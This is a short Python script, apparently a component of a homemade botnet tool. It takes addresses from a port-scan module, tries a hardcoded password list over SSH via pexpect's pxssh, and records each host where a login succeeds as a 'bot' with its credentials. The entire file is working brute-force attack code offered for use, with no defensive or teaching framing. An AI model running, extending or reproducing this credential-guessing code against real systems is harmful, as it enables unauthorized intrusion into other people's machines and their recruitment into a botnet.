from pexpect import pxssh
import PortScan



def generateLogins():
	# Create a password dictionary
	passwords = ['security', 'incorrect password', 'password2']
	bots = []
	user = 'viiwee'


	def connect(host, user, password):
		try:
			connection = pxssh.pxssh()
			connection.login(host, user, password)
			return connection
		except:
			return False


	for viable_ip in PortScan.findAddresses():
		# print(viable_ip)
		# Try all of the passwords to attempt to connect
		for password in passwords:
			connection = connect(viable_ip, user, password)
			if not connection:  # If connection is refused or otherwise fails, returns false
				# print('Tried: ' + password + ' and failed')
				continue
			bots.append([viable_ip, user, password])
			break  # Password is correct, continue on
		# We have an IP that we can connect to, and we have a login
		# Return a list of bots and the login info
	return bots